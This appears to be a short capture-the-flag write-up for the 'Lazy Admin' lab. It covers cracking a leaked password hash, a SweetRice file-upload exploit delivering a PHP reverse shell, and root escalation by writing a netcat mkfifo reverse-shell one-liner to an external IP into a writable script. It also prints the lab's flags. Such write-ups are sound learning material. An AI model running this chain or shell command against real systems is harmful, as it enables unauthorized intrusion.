### Lazy Admin

# export IP=10.10.170.94

## nmap 

## found /content/inc

in that found mysql_backups

multiple queries were included and found a hash passwd:42f749ade7f9e195bf475f37a44cafcb

used my online tool and found the hash to be : Password123

guessing the username to be:manager

found an exploit where i can upload a file in sweetrice and ran it with the username and password and uploaded my reverse-shell-php.phtml

got the reverse shell and found a itguy named user

### got the user flag: THM{63e5bce9271952aad1113b6f1ac28a07} ###

did sudo -l 
and found that i can run :
/usr/bin/perl /home/itguy/backup.pl

i didnt have write permission on backup.pl

bt ultimately backup.pl was running /etc/copy.sh in sh shell
and i can write on /etc/copy.sh

ran the following cmd:

 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.20.147 4445 >/tmp/f" > /etc/copy.sh

 and ran the cmd that i could have ran as sudo and got a reverse shell with root previlages:

### found the root flag: THM{6637f41d0177b6f37cb20d775124699f} ###